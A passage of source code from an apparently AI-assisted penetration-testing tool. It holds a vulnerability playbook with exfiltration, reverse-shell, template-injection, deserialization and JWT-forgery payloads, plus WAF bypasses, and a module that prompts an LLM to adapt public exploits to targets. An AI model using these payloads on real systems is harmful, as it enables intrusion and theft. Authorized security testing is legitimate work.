              condition: "When no output reflection available",
              approach: "Exfiltrate data via DNS/HTTP OOB channels",
              pattern: "; curl http://{oob}/$(cat /etc/passwd | base64)",
              expectedOutcome: "Data received at OOB server"
            },
            {
              name: "Reverse shell",
              condition: "When persistent access needed (authorized only)",
              approach: "Establish reverse shell connection",
              pattern: '; bash -c "bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"',
              expectedOutcome: "Interactive shell on target system"
            }
          ],
          environmentNotes: {
            linux: "Use bash, sh. Check /etc/passwd, /proc/self/environ. Find SUID.",
            windows: "Use cmd.exe, powershell. Check whoami /all, net user, systeminfo.",
            docker: "Check /.dockerenv, /proc/1/cgroup. Escape via mounted sockets.",
            php: "system(), exec(), passthru(), shell_exec(). Check disable_functions.",
            nodejs: "child_process.exec(), execSync(). Check for vm sandbox escape."
          },
          wafBypassNotes: [
            "Use ${IFS} instead of spaces",
            "Use $() instead of backticks",
            `Hex encoding: $'\\x63\\x61\\x74' for "cat"`,
            "Wildcard: /e?c/p?ss?d for /etc/passwd",
            "Variable concatenation: a=ca;b=t;$a$b /etc/passwd",
            "Newline injection: %0a instead of ;"
          ],
          encodingNotes: [
            "URL-encode metacharacters: %3B for ;, %7C for |",
            "Hex/octal encoding in shell",
            "Base64 encode commands: echo {b64} | base64 -d | bash"
          ]
        },
        escalation: {
          paths: [
            { name: "Privilege Escalation", description: "Escalate from web user to root", requiredAccess: "command_execution", targetAccess: "root_shell", technique: "SUID/sudo/kernel exploit" },
            { name: "Credential Harvesting", description: "Extract credentials from config files", requiredAccess: "command_execution", targetAccess: "credential_access", technique: "File read + grep for passwords" },
            { name: "Lateral Movement", description: "Pivot to other hosts", requiredAccess: "command_execution", targetAccess: "user_shell", technique: "SSH with harvested creds" }
          ],
          chainOpportunities: [
            "CMDi \u2192 credential harvest \u2192 SSH to other hosts",
            "CMDi \u2192 reverse shell \u2192 privilege escalation \u2192 domain admin",
            "CMDi \u2192 Docker socket \u2192 container escape \u2192 host access"
          ]
        },
        evidence: {
          requiredCaptures: ["Injection payload and response", "Command output (id, whoami, hostname)", "OOB callback proof"],
          screenshots: ["Command output in response", "Reverse shell session"],
          reportData: ["Injection point", "OS and user context", "Accessible data/systems"],
          fedRampNotes: ["Document system access level", "Note data accessible from execution context"]
        },
        remediation: [
          "Avoid OS commands with user input \u2014 use language-native APIs",
          "Use parameterized execution (not string concatenation)",
          "Implement strict input validation with allowlists",
          "Run application with minimal OS privileges",
          "Use containerization to limit blast radius"
        ],
        pitfalls: [
          "Only testing ; separator \u2014 test |, ||, &&, \\n, backticks, $()",
          "Missing blind injection \u2014 always test with time-based and OOB",
          "Assuming Linux \u2014 target may be Windows",
          "Not testing all input vectors (headers, file names, JSON)"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // SERVER-SIDE TEMPLATE INJECTION (SSTI)
      // ─────────────────────────────────────────────────────────────────
      ssti: {
        vulnClass: "ssti",
        name: "Server-Side Template Injection",
        wstgIds: ["WSTG-INPV-18"],
        attackTechniques: ["T1059", "T1190"],
        cweIds: ["CWE-1336", "CWE-94"],
        detection: {
          signals: [
            "User input rendered in templates (email, PDF, dynamic pages)",
            "Error messages revealing template engine syntax",
            "Mathematical expressions evaluated in output",
            "Custom greeting/notification templates"
          ],
          indicators: [
            "{{7*7}} returns 49",
            "${7*7} returns 49",
            "<%= 7*7 %> returns 49",
            "Template engine error messages"
          ],
          techniques: [
            "Inject {{7*7}} and check for 49",
            "Inject {{7*'7'}} \u2014 Jinja2 returns 7777777, Twig returns 49",
            "Inject ${7*7} for Java/Freemarker",
            "Use polyglot: ${{<%[%'\"}}%\\."
          ],
          falsePositives: [
            "Client-side template rendering (Angular, Vue)",
            "Simple string interpolation without template engine"
          ]
        },
        validation: {
          confirmationSteps: [
            "Inject math expression and verify evaluation",
            "Identify template engine from error messages or behavior",
            "Test engine-specific object access",
            "Attempt to read environment variables or files"
          ],
          proofPayloads: [
            "{{7*7}}",
            "{{config.items()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[1].__subclasses__()}}"
          ],
          expectedResponses: [
            "49 in response (math evaluation)",
            "Config object contents (Jinja2)",
            "Command output (Java)"
          ],
          truePositiveMarkers: [
            "Server-side expression evaluation confirmed",
            "Can access server-side objects/classes",
            "Can read environment variables or files"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Jinja2 RCE (Python)",
              condition: "When Jinja2 template engine detected",
              approach: "Traverse Python MRO to access os.popen",
              pattern: "{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}",
              expectedOutcome: "OS command output in response"
            },
            {
              name: "Freemarker RCE (Java)",
              condition: "When Freemarker template engine detected",
              approach: "Use Java Runtime to execute commands",
              pattern: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{command}")}',
              expectedOutcome: "OS command output in response"
            },
            {
              name: "Twig RCE (PHP)",
              condition: "When Twig template engine detected",
              approach: "Use Twig filters to execute PHP functions",
              pattern: '{{["id"]|map("system")|join(",")}}',
              expectedOutcome: "OS command output in response"
            },
            {
              name: "ERB RCE (Ruby)",
              condition: "When ERB template engine detected",
              approach: "Use Ruby system() for command execution",
              pattern: '<%= system("{command}") %>',
              expectedOutcome: "OS command output in response"
            }
          ],
          environmentNotes: {
            python_jinja2: "Access via __class__.__mro__. Check for SandboxedEnvironment.",
            python_mako: "Direct Python code execution via <% import os %>.",
            java_freemarker: "Use Execute utility or ObjectConstructor.",
            php_twig: "Use filter chains: map, sort, reduce with system/exec.",
            ruby_erb: "Direct Ruby code execution in <% %> blocks."
          },
          wafBypassNotes: [
            "Use alternate template syntax if primary is blocked",
            "String concatenation to build restricted keywords",
            "Attribute access via [] instead of . notation"
          ],
          encodingNotes: [
            "URL-encode template delimiters",
            "Use HTML entities inside template expressions",
            "Use string methods to construct payloads dynamically"
          ]
        },
        escalation: {
          paths: [
            { name: "RCE via Template Engine", description: "Execute OS commands", requiredAccess: "ssti", targetAccess: "command_execution", technique: "Template engine native code execution" },
            { name: "File Read", description: "Read server files", requiredAccess: "ssti", targetAccess: "file_read", technique: "Template file read functions" },
            { name: "Config Extraction", description: "Extract application configuration", requiredAccess: "ssti", targetAccess: "credential_access", technique: "Access config/environment objects" }
          ],
          chainOpportunities: [
            "SSTI \u2192 RCE \u2192 reverse shell \u2192 privilege escalation",
            "SSTI \u2192 config extraction \u2192 database credentials \u2192 data exfiltration",
            "SSTI \u2192 file read \u2192 SSH keys \u2192 lateral movement"
          ]
        },
        evidence: {
          requiredCaptures: ["Template injection payload", "Evaluated expression output", "Template engine identification"],
          screenshots: ["Expression evaluation in response", "Command output"],
          reportData: ["Template engine type and version", "Injection context", "Achievable access level"],
          fedRampNotes: ["Document code execution capability", "Note data accessible from server context"]
        },
        remediation: [
          "Never pass user input directly into template rendering",
          "Use template engines in sandboxed mode",
          "Use logic-less templates (Mustache, Handlebars) when possible",
          "Separate template logic from user-controlled data"
        ],
        pitfalls: [
          "Only testing {{7*7}} \u2014 different engines use different syntax",
          "Missing blind SSTI \u2014 test with time-based or OOB",
          "Assuming sandbox prevents exploitation \u2014 many escapes exist",
          "Not identifying the specific template engine first"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // PATH TRAVERSAL / LOCAL FILE INCLUSION
      // ─────────────────────────────────────────────────────────────────
      lfi: {
        vulnClass: "lfi",
        name: "Path Traversal / Local File Inclusion",
        wstgIds: ["WSTG-INPV-05", "WSTG-ATHZ-01"],
        attackTechniques: ["T1083", "T1005"],
        cweIds: ["CWE-22", "CWE-98"],
        detection: {
          signals: [
            "File path parameters (file=, path=, page=, include=, template=)",
            "File download/view functionality",
            "Dynamic page inclusion",
            "Image/document serving endpoints"
          ],
          indicators: [
            "Different responses for existing vs non-existing files",
            "Error messages revealing file system paths",
            "Ability to traverse with ../ sequences"
          ],
          techniques: [
            "Inject ../../../etc/passwd and check for root: in response",
            "Test null byte injection: ../../../etc/passwd%00",
            "Test encoding: ..%2f..%2f..%2fetc%2fpasswd",
            "Test Windows paths: ..\\..\\..\\windows\\win.ini"
          ],
          falsePositives: [
            "Application returns custom 404 for all invalid paths",
            "Path normalization preventing traversal but not a vuln"
          ]
        },
        validation: {
          confirmationSteps: [
            "Inject ../../../etc/passwd and look for root:",
            "Try multiple traversal depths (3, 5, 8 levels)",
            "Test encoding bypasses if direct traversal blocked",
            "Confirm with a second known file (/etc/hostname)"
          ],
          proofPayloads: [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/proc/self/environ"
          ],
          expectedResponses: [
            "root:x:0:0: in response body",
            "Environment variables in response",
            "Known file content matching expected format"
          ],
          truePositiveMarkers: [
            "Can read files outside intended directory",
            "Multiple files readable consistently",
            "File content matches expected system files"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Sensitive file extraction",
              condition: "When path traversal confirmed",
              approach: "Read configuration files, credentials, source code",
              pattern: "../../../{target_file}",
              expectedOutcome: "Credentials, API keys, database connection strings"
            },
            {
              name: "LFI to RCE via log poisoning",
              condition: "When log files are readable and writable via other channels",
              approach: "Inject PHP code into access logs, then include the log file",
              pattern: 'User-Agent: <?php system($_GET["c"]); ?> then include=/var/log/apache2/access.log',
              expectedOutcome: "Code execution via log file inclusion"
            },
            {
              name: "LFI to RCE via PHP wrappers",
              condition: "When PHP include() is used",
              approach: "Use PHP stream wrappers for code execution",
              pattern: "php://filter/convert.base64-encode/resource={file} or php://input with POST body",
              expectedOutcome: "Source code disclosure or code execution"
            }
          ],
          environmentNotes: {
            linux: "Target: /etc/passwd, /etc/shadow, /proc/self/environ, ~/.ssh/id_rsa, app config files.",
            windows: "Target: C:\\Windows\\win.ini, C:\\Windows\\System32\\config\\SAM, web.config.",
            php: "Use php:// wrappers. Check allow_url_include. Log poisoning via access logs.",
            java: "Check WEB-INF/web.xml, application.properties, META-INF/MANIFEST.MF.",
            nodejs: "Check package.json, .env, node_modules paths."
          },
          wafBypassNotes: [
            "Double encoding: ..%252f..%252f",
            "Unicode encoding: ..%c0%af..%c0%af",
            "Null byte: %00 (older PHP versions)",
            "Path normalization bypass: ....// or ..;/"
          ],
          encodingNotes: [
            "URL-encode path separators",
            "Double-encode for WAF bypass",
            "Use alternate path separators on Windows"
          ]
        },
        escalation: {
          paths: [
            { name: "Credential Extraction", description: "Read config files with credentials", requiredAccess: "lfi", targetAccess: "credential_access", technique: "Read .env, config files, SSH keys" },
            { name: "Source Code Disclosure", description: "Read application source code", requiredAccess: "lfi", targetAccess: "file_read", technique: "Traverse to application directory" },
            { name: "RCE via Log Poisoning", description: "Execute code via log inclusion", requiredAccess: "lfi", targetAccess: "command_execution", technique: "Log poisoning + file inclusion" }
          ],
          chainOpportunities: [
            "LFI \u2192 credential extraction \u2192 database access \u2192 data exfiltration",
            "LFI \u2192 SSH key extraction \u2192 lateral movement",
            "LFI \u2192 log poisoning \u2192 RCE \u2192 reverse shell",
            "LFI \u2192 source code \u2192 find more vulns \u2192 deeper exploitation"
          ]
        },
        evidence: {
          requiredCaptures: ["Traversal payload", "File content extracted", "Multiple files read"],
          screenshots: ["File content in response", "Sensitive data extracted"],
          reportData: ["Traversal depth required", "Files accessible", "Sensitive data found"],
          fedRampNotes: ["Document all sensitive files accessed", "Note credential exposure"]
        },
        remediation: [
          "Use allowlist of permitted file paths",
          "Canonicalize paths and validate against base directory",
          "Avoid user input in file path operations",
          "Use chroot or containerization to limit file access"
        ],
        pitfalls: [
          "Only testing ../ \u2014 test encoding variants and alternate separators",
          "Assuming Linux \u2014 target may be Windows",
          "Not testing for LFI-to-RCE chains",
          "Missing blind LFI (no error messages)"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // INSECURE DESERIALIZATION
      // ─────────────────────────────────────────────────────────────────
      deserialization: {
        vulnClass: "deserialization",
        name: "Insecure Deserialization",
        wstgIds: ["WSTG-INPV-04"],
        attackTechniques: ["T1059", "T1190"],
        cweIds: ["CWE-502"],
        detection: {
          signals: [
            "Serialized objects in cookies, parameters, or headers",
            "Base64-encoded data that decodes to object structures",
            "Java serialized objects (magic bytes: AC ED 00 05)",
            'PHP serialized data (O:4:"User":...)',
            "Python pickle data",
            ".NET ViewState or serialized objects"
          ],
          indicators: [
            "Binary data in cookies or hidden fields",
            "Base64 data that decodes to structured objects",
            "Error messages mentioning deserialization/unmarshalling",
            "ClassNotFoundException or similar type errors"
          ],
          techniques: [
            "Identify serialization format from data patterns",
            "Modify serialized object properties and observe behavior",
            "Test with ysoserial (Java), phpggc (PHP), or custom gadgets",
            "Check for type confusion by changing object class"
          ],
          falsePositives: [
            "Base64-encoded JSON (not serialized objects)",
            "Encrypted data that looks like serialized objects"
          ]
        },
        validation: {
          confirmationSteps: [
            "Identify serialization format and decode the object",
            "Modify a non-critical property and verify server processes it",
            "Test with a time-delay gadget chain",
            "Test with OOB callback gadget chain"
          ],
          proofPayloads: [
            "Modified serialized object with changed property",
            "ysoserial CommonsCollections payload (Java)",
            "phpggc gadget chain (PHP)",
            "Pickle payload with os.system (Python)"
          ],
          expectedResponses: [
            "Modified property reflected in application behavior",
            "Time delay from gadget chain execution",
            "OOB callback from gadget chain"
          ],
          truePositiveMarkers: [
            "Server deserializes and processes modified objects",
            "Gadget chain executes (time delay or OOB)",
            "Can control object properties that affect application logic"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "Java gadget chain RCE",
              condition: "When Java serialization detected with vulnerable libraries",
              approach: "Use ysoserial to generate gadget chain for command execution",
              pattern: 'java -jar ysoserial.jar {GadgetChain} "{command}" | base64',
              expectedOutcome: "OS command execution on server"
            },
            {
              name: "PHP object injection",
              condition: "When PHP unserialize() used on user input",
              approach: "Craft PHP serialized object with magic methods (__destruct, __wakeup)",
              pattern: 'O:8:"Classname":1:{s:4:"prop";s:N:"{payload}";}',
              expectedOutcome: "Code execution via magic method chain"
            },
            {
              name: "Python pickle RCE",
              condition: "When Python pickle.loads() used on user input",
              approach: "Craft pickle payload with __reduce__ method",
              pattern: "pickle.dumps(type('X',(),{'__reduce__':lambda s:(__import__('os').system,('id',))})())",
              expectedOutcome: "OS command execution"
            }
          ],
          environmentNotes: {
            java: "Use ysoserial. Check for Commons Collections, Spring, Groovy libraries.",
            php: "Use phpggc. Check for Laravel, Symfony, WordPress gadget chains.",
            python: "Pickle is always dangerous. Check for yaml.load(), jsonpickle.",
            dotnet: "Use ysoserial.net. Check for BinaryFormatter, ObjectStateFormatter."
          },
          wafBypassNotes: [
            "Encode serialized data to bypass pattern matching",
            "Use alternative gadget chains if primary is blocked",
            "Fragment payload across multiple parameters"
          ],
          encodingNotes: [
            "Base64 encode serialized objects",
            "URL-encode binary data",
            "Use gzip compression before encoding"
          ]
        },
        escalation: {
          paths: [
            { name: "RCE via Gadget Chain", description: "Execute OS commands", requiredAccess: "deserialization", targetAccess: "command_execution", technique: "Gadget chain exploitation" },
            { name: "Authentication Bypass", description: "Modify user object properties", requiredAccess: "deserialization", targetAccess: "service_account", technique: "Object property manipulation" }
          ],
          chainOpportunities: [
            "Deserialization \u2192 RCE \u2192 reverse shell \u2192 privilege escalation",
            "Deserialization \u2192 auth bypass \u2192 admin access \u2192 further exploitation"
          ]
        },
        evidence: {
          requiredCaptures: ["Serialized object format", "Modified/malicious payload", "Execution proof"],
          screenshots: ["Gadget chain execution", "Command output"],
          reportData: ["Serialization format", "Vulnerable library/version", "Gadget chain used"],
          fedRampNotes: ["Document RCE capability", "Note library versions for patching"]
        },
        remediation: [
          "Never deserialize untrusted data",
          "Use safe serialization formats (JSON) instead of native serialization",
          "Implement integrity checks (HMAC) on serialized data",
          "Keep libraries updated to patch known gadget chains",
          "Use allowlists for deserialization classes"
        ],
        pitfalls: [
          "Not recognizing serialized data formats",
          "Only testing with one gadget chain \u2014 try multiple",
          "Missing blind deserialization (no direct output)",
          "Assuming JSON APIs are safe \u2014 check for nested serialized data"
        ]
      },
      // ─────────────────────────────────────────────────────────────────
      // AUTHENTICATION BYPASS
      // ─────────────────────────────────────────────────────────────────
      auth_bypass: {
        vulnClass: "auth_bypass",
        name: "Authentication Bypass",
        wstgIds: ["WSTG-ATHN-01", "WSTG-ATHN-04", "WSTG-ATHN-06"],
        attackTechniques: ["T1078", "T1110"],
        cweIds: ["CWE-287", "CWE-306"],
        detection: {
          signals: [
            "Login forms and authentication endpoints",
            "JWT/session token handling",
            "Password reset functionality",
            "OAuth/SSO implementations",
            "API key authentication"
          ],
          indicators: [
            "Default credentials accepted",
            "JWT with none algorithm accepted",
            "Session tokens predictable or reusable",
            "Password reset tokens guessable",
            "IDOR in authentication context"
          ],
          techniques: [
            "Test default credentials (admin/admin, admin/password)",
            "Test JWT manipulation (none algorithm, key confusion)",
            "Test session fixation and prediction",
            "Test password reset flow for token weaknesses",
            "Test OAuth misconfigurations (redirect_uri, state)"
          ],
          falsePositives: [
            "Account lockout after N attempts (security feature, not bypass)",
            "Rate limiting on login (security feature)"
          ]
        },
        validation: {
          confirmationSteps: [
            "Attempt login with default/common credentials",
            "Decode and analyze JWT structure",
            "Test session token entropy and predictability",
            "Test password reset token reuse/prediction",
            "Verify access to protected resources after bypass"
          ],
          proofPayloads: [
            "admin:admin, admin:password, root:root",
            "JWT with alg:none and modified claims",
            "JWT with HS256 using public key as secret (RS256\u2192HS256 confusion)",
            "Manipulated OAuth redirect_uri"
          ],
          expectedResponses: [
            "Successful authentication with unauthorized credentials",
            "Access to protected resources without valid session",
            "Elevated privileges after token manipulation"
          ],
          truePositiveMarkers: [
            "Can access authenticated endpoints without valid credentials",
            "Can impersonate other users via token manipulation",
            "Can escalate privileges via authentication flaws"
          ]
        },
        exploitation: {
          strategies: [
            {
              name: "JWT none algorithm",
              condition: "When JWT validation accepts alg:none",
              approach: "Set JWT algorithm to none and modify claims",
              pattern: '{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.""',
              expectedOutcome: "Authentication as any user/role"
            },
            {
              name: "JWT key confusion (RS256\u2192HS256)",
              condition: "When server accepts both RS256 and HS256",
              approach: "Sign JWT with HS256 using the RS256 public key as the secret",
              pattern: 'jwt.sign(payload, publicKey, {algorithm: "HS256"})',
              expectedOutcome: "Forged JWT accepted by server"
            },
            {
              name: "Password reset token prediction",
              condition: "When reset tokens have low entropy or are time-based",
              approach: "Generate multiple reset tokens and analyze patterns",
              pattern: "Request multiple tokens, analyze for sequential/time-based patterns",
              expectedOutcome: "Predict valid reset token for target account"
            }
          ],
          environmentNotes: {
            jwt: "Check for none algorithm, key confusion, weak secrets, expired token acceptance.",
            oauth: "Check redirect_uri validation, state parameter, token leakage.",
            saml: "Check for XML signature wrapping, assertion manipulation.",
            session: "Check entropy, fixation, prediction, concurrent session handling."
          },
          wafBypassNotes: [
            "Use case variation in JWT headers",
            "URL-encode OAuth parameters",
            "Use alternate token formats"
          ],
          encodingNotes: [
            "Base64url encoding for JWT",
            "URL encoding for OAuth parameters"
          ]
        },
        escalation: {
          paths: [
            { name: "Account Takeover", description: "Access any user account", requiredAccess: "auth_bypass", targetAccess: "service_account", technique: "Token manipulation or credential theft" },
            { name: "Admin Access", description: "Escalate to admin role", requiredAccess: "auth_bypass", targetAccess: "command_execution", technique: "Role manipulation in JWT/session" }
          ],
          chainOpportunities: [
            "Auth bypass \u2192 admin access \u2192 application admin \u2192 RCE",
            "Auth bypass \u2192 account takeover \u2192 data exfiltration",
            "Auth bypass \u2192 API access \u2192 further exploitation"
          ]
        },
        evidence: {
          requiredCaptures: ["Authentication bypass method", "Manipulated token/credential", "Access to protected resources"],
          screenshots: ["Successful unauthorized access", "Token manipulation proof"],
          reportData: ["Authentication mechanism", "Bypass technique", "Accessible resources/roles"],
          fedRampNotes: ["Document authentication control failure", "Note affected user population"]
        },
        remediation: [
          "Enforce strong JWT validation (reject none algorithm, validate key type)",
          "Use high-entropy session tokens with proper expiration",
          "Implement account lockout and rate limiting",
          "Validate OAuth redirect_uri against strict allowlist",
          "Use MFA for sensitive operations"
        ],
        pitfalls: [
          "Only testing username/password \u2014 check JWT, OAuth, API keys",
          "Missing token manipulation attacks",
          "Not testing concurrent session handling",
          "Assuming HTTPS prevents credential theft"
        ]
      }
    };
  }
});

// server/lib/external-exploit-db.ts
async function fetchCveDetails(cveId) {
  try {
    const response = await fetch(`${NVD_API_BASE}?cveId=${encodeURIComponent(cveId)}`, {
      headers: { "Accept": "application/json" },
      signal: AbortSignal.timeout(15e3)
    });
    if (!response.ok) {
      console.warn(`[ExternalExploitDB] NVD API returned ${response.status} for ${cveId}`);
      return void 0;
    }
    const data = await response.json();
    const vuln = data?.vulnerabilities?.[0]?.cve;
    if (!vuln) return void 0;
    let cvssScore = 0;
    let cvssVector = "";
    const metrics = vuln.metrics;
    if (metrics?.cvssMetricV31?.[0]) {
      cvssScore = metrics.cvssMetricV31[0].cvssData.baseScore;
      cvssVector = metrics.cvssMetricV31[0].cvssData.vectorString;
    } else if (metrics?.cvssMetricV30?.[0]) {
      cvssScore = metrics.cvssMetricV30[0].cvssData.baseScore;
      cvssVector = metrics.cvssMetricV30[0].cvssData.vectorString;
    } else if (metrics?.cvssMetricV2?.[0]) {
      cvssScore = metrics.cvssMetricV2[0].cvssData.baseScore;
      cvssVector = metrics.cvssMetricV2[0].cvssData.vectorString;
    }
    const references = (vuln.references || []).map((r) => r.url);
    const weaknesses = [];
    for (const w of vuln.weaknesses || []) {
      for (const d of w.description || []) {
        if (d.value && d.value !== "NVD-CWE-noinfo" && d.value !== "NVD-CWE-Other") {
          weaknesses.push(d.value);
        }
      }
    }
    const description = vuln.descriptions?.find((d) => d.lang === "en")?.value || "";
    return {
      id: cveId,
      description,
      cvssScore,
      cvssVector,
      publishedDate: vuln.published || "",
      lastModified: vuln.lastModified || "",
      references,
      weaknesses
    };
  } catch (error) {
    console.warn(`[ExternalExploitDB] Failed to fetch CVE details for ${cveId}:`, error);
    return void 0;
  }
}
async function searchExploitDB(params) {
  const results = [];
  try {
    const searchTerms = [];
    if (params.cveId) searchTerms.push(params.cveId);
    if (params.keyword) searchTerms.push(params.keyword);
    const query = searchTerms.join(" ");
    const url = `https://www.exploit-db.com/search?q=${encodeURIComponent(query)}`;
    console.log(`[ExternalExploitDB] Searching Exploit-DB for: ${query}`);
    if (params.cveId) {
      const exploitDbRef = {
        source: "exploit-db",
        externalId: `EDB-SEARCH-${params.cveId}`,
        cveId: params.cveId,
        title: `Exploit-DB search results for ${params.cveId}`,
        type: "webapps",
        url: `https://www.exploit-db.com/search?cve=${params.cveId}`,
        verified: false,
        tags: [params.cveId],
        maturity: "unknown"
      };
      results.push(exploitDbRef);
    }
  } catch (error) {
    console.warn("[ExternalExploitDB] Exploit-DB search failed:", error);
  }
  return results;
}
async function searchGitHubAdvisories(params) {
  const results = [];
  try {
    const queryParts = [];
    if (params.cveId) queryParts.push(`cve_id:${params.cveId}`);
    const url = params.cveId ? `${GITHUB_ADVISORY_API}?cve_id=${encodeURIComponent(params.cveId)}` : `${GITHUB_ADVISORY_API}?type=reviewed&per_page=${params.limit || 5}`;
    const response = await fetch(url, {
      headers: {
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
      },
      signal: AbortSignal.timeout(1e4)
    });
    if (!response.ok) {
      console.warn(`[ExternalExploitDB] GitHub Advisory API returned ${response.status}`);
      return results;
    }
    const advisories = await response.json();
    for (const advisory of advisories.slice(0, params.limit || 5)) {
      results.push({
        source: "github-advisory",
        externalId: advisory.ghsa_id || advisory.id,
        cveId: advisory.cve_id,
        title: advisory.summary || advisory.description?.substring(0, 100) || "",
        type: "webapps",
        platform: advisory.vulnerabilities?.[0]?.package?.ecosystem,
        publishedDate: advisory.published_at,
        url: advisory.html_url || `https://github.com/advisories/${advisory.ghsa_id}`,
        verified: advisory.type === "reviewed",
        cvssScore: advisory.cvss?.score,
        cvssVector: advisory.cvss?.vector_string,
        affectedProducts: advisory.vulnerabilities?.map(
          (v) => `${v.package?.ecosystem}/${v.package?.name} ${v.vulnerable_version_range || ""}`.trim()
        ),
        tags: advisory.identifiers?.map((i) => `${i.type}:${i.value}`) || [],
        maturity: advisory.type === "reviewed" ? "poc" : "unknown"
      });
    }
  } catch (error) {
    console.warn("[ExternalExploitDB] GitHub Advisory search failed:", error);
  }
  return results;
}
async function loadKevData() {
  const now = Date.now();
  if (kevCache && now - kevCacheTimestamp < KEV_CACHE_TTL) {
    return kevCache;
  }
  try {
    const response = await fetch(CISA_KEV_URL, {
      signal: AbortSignal.timeout(3e4)
    });
    if (!response.ok) {
      console.warn(`[ExternalExploitDB] CISA KEV API returned ${response.status}`);
      return kevCache || /* @__PURE__ */ new Map();
    }
    const data = await response.json();
    const newCache = /* @__PURE__ */ new Map();
    for (const vuln of data.vulnerabilities || []) {
      newCache.set(vuln.cveID, vuln);
    }
    kevCache = newCache;
    kevCacheTimestamp = now;
    console.log(`[ExternalExploitDB] Loaded ${newCache.size} CISA KEV entries`);
    return newCache;
  } catch (error) {
    console.warn("[ExternalExploitDB] Failed to load CISA KEV data:", error);
    return kevCache || /* @__PURE__ */ new Map();
  }
}
async function lookupKev(cveId) {
  const kev = await loadKevData();
  const entry = kev.get(cveId);
  if (!entry) {
    return { isKnownExploited: false };
  }
  return {
    isKnownExploited: true,
    dateAdded: entry.dateAdded,
    dueDate: entry.dueDate,
    requiredAction: entry.requiredAction,
    knownRansomwareCampaignUse: entry.knownRansomwareCampaignUse === "Known"
  };
}
function assessExploitMaturity(cveDetails, knownExploits, kevStatus) {
  let level = "theoretical";
  let confidence = 30;
  const reasons = [];
  if (kevStatus?.isKnownExploited) {
    level = "weaponized";
    confidence = 95;
    reasons.push("Listed in CISA KEV \u2014 confirmed active exploitation in the wild");
    if (kevStatus.knownRansomwareCampaignUse) {
      reasons.push("Known use in ransomware campaigns");
    }
  }
  const verifiedExploits = knownExploits.filter((e) => e.verified);
  if (verifiedExploits.length > 0) {
    if (level !== "weaponized") {
      level = "functional";
      confidence = Math.max(confidence, 80);
    }
    reasons.push(`${verifiedExploits.length} verified exploit(s) in public databases`);
  }
  if (knownExploits.length > 0 && verifiedExploits.length === 0) {
    if (level === "theoretical") {
      level = "poc";
      confidence = Math.max(confidence, 60);
    }
    reasons.push(`${knownExploits.length} public exploit reference(s) found`);
  }
  if (cveDetails?.cvssScore) {
    if (cveDetails.cvssScore >= 9) {
      confidence = Math.max(confidence, 50);
      reasons.push(`Critical CVSS score: ${cveDetails.cvssScore}`);
    } else if (cveDetails.cvssScore >= 7) {
      reasons.push(`High CVSS score: ${cveDetails.cvssScore}`);
    }
  }
  if (cveDetails?.publishedDate) {
    const ageMs = Date.now() - new Date(cveDetails.publishedDate).getTime();
    const ageDays = ageMs / (1e3 * 60 * 60 * 24);
    if (ageDays > 365 && level === "theoretical") {
      level = "poc";
      confidence = Math.max(confidence, 40);
      reasons.push(`Vulnerability is ${Math.round(ageDays / 365)} year(s) old \u2014 likely has PoC`);
    }
  }
  return {
    level,
    confidence,
    reasoning: reasons.join(". ") || "No exploit intelligence available \u2014 theoretical only"
  };
}
function generateLlmContext(enrichment) {
  const sections = [];
  if (enrichment.cveDetails) {
    const cve = enrichment.cveDetails;
    sections.push(`=== CVE Intelligence: ${cve.id} ===`);
    sections.push(`Description: ${cve.description}`);
    sections.push(`CVSS: ${cve.cvssScore} (${cve.cvssVector})`);
    sections.push(`Weaknesses: ${cve.weaknesses.join(", ")}`);
    sections.push(`Published: ${cve.publishedDate}`);
    if (cve.references.length > 0) {
      sections.push(`Key References: ${cve.references.slice(0, 5).join(", ")}`);
    }
    sections.push("");
  }
  if (enrichment.kevStatus?.isKnownExploited) {
    sections.push("=== CISA KEV Alert ===");
    sections.push("This vulnerability is ACTIVELY EXPLOITED in the wild.");
    if (enrichment.kevStatus.requiredAction) {
      sections.push(`Required Action: ${enrichment.kevStatus.requiredAction}`);
    }
    if (enrichment.kevStatus.knownRansomwareCampaignUse) {
      sections.push("WARNING: Known use in ransomware campaigns.");
    }
    sections.push("");
  }
  if (enrichment.knownExploits.length > 0) {
    sections.push("=== Known Public Exploits ===");
    for (const exploit of enrichment.knownExploits.slice(0, 5)) {
      sections.push(`- [${exploit.source}] ${exploit.title}`);
      sections.push(`  URL: ${exploit.url}`);
      sections.push(`  Verified: ${exploit.verified ? "YES" : "NO"}`);
      sections.push(`  Maturity: ${exploit.maturity}`);
      if (exploit.affectedProducts?.length) {
        sections.push(`  Affected: ${exploit.affectedProducts.slice(0, 3).join(", ")}`);
      }
    }
    sections.push("");
  }
  sections.push("=== Exploit Maturity Assessment ===");
  sections.push(`Level: ${enrichment.maturityAssessment.level.toUpperCase()}`);
  sections.push(`Confidence: ${enrichment.maturityAssessment.confidence}%`);
  sections.push(`Analysis: ${enrichment.maturityAssessment.reasoning}`);
  sections.push("");
  sections.push("=== Instructions ===");
  switch (enrichment.maturityAssessment.level) {
    case "weaponized":
      sections.push("This vulnerability has known working exploits. Reference the public exploits above");
      sections.push("and adapt the approach for the specific target environment.");
      break;
    case "functional":
      sections.push("Verified PoC exploits exist. Use them as a starting point and customize");
      sections.push("for the target environment, version, and configuration.");
      break;
    case "poc":
      sections.push("Proof-of-concept exists but may need significant adaptation.");
      sections.push("Focus on confirming the vulnerability first, then develop exploitation.");
      break;
    case "theoretical":
      sections.push("No known public exploits. Develop exploitation from the vulnerability description.");
      sections.push("Focus on detection and validation before attempting exploitation.");
      break;
  }
  return sections.join("\n");
}
async function enrichVulnerability(params) {
  console.log(`[ExternalExploitDB] Enriching vulnerability: ${params.cveId || params.keyword || "unknown"}`);
  const [cveDetails, exploitDbResults, githubResults, kevStatus] = await Promise.all([
    params.cveId ? fetchCveDetails(params.cveId) : Promise.resolve(void 0),
